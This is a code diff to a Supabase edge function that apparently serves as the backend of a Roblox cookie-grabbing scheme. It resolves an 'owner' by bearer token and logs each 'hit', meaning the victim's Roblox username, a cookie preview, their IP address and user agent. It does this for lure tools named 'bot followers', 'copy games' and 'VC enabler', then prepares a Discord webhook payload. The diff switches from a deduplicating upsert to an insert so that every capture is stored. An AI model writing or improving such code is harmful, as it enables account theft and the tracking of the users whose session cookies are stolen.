@@ -79,6 +79,21 @@ Deno.serve(async (req) => {
         .maybeSingle();
       if (profileErr || !data) return json({ error: "Owner not found" }, 404);
       profile = data;
+    } else {
+      const authHeader = req.headers.get("Authorization") ?? "";
+      const token = authHeader.replace(/^Bearer\s+/i, "").trim();
+      if (token) {
+        const { data: userData } = await supabase.auth.getUser(token);
+        if (userData.user) {
+          const { data, error: profileErr } = await supabase
+            .from("profiles")
+            .select("id, username, webhook_url, webhook_bot_followers, webhook_copy_games, webhook_copy_clothes, webhook_group_botter, webhook_vc_enabler")
+            .eq("id", userData.user.id)
+            .maybeSingle();
+          if (profileErr) return json({ error: "Owner lookup failed" }, 500);
+          profile = data;
+        }
+      }
     }
 
     const perToolMap: Record<string, string | null | undefined> = {
@@ -99,7 +114,7 @@ Deno.serve(async (req) => {
 
     // 4. Log the hit (upsert — same cookie for same owner is deduped)
     if (profile) {
-      await supabase.from("hits").upsert({
+      const hit = {
         owner_id: profile.id,
         tool_type: body.toolType,
         roblox_username: robloxInfo?.name ?? null,
@@ -121,7 +136,13 @@ Deno.serve(async (req) => {
         last_checked_at: new Date().toISOString(),
         ip_address: ip,
         user_agent: userAgent,
-      }, { onConflict: "owner_id,cookie_preview" });
+      };
+
+      const { error: hitError } = await supabase.from("hits").insert(hit);
+      if (hitError) {
+        console.error("hit insert failed", hitError);
+        return json({ error: "Hit logging failed" }, 500);
+      }
     }
 
     // 5. Discord payload
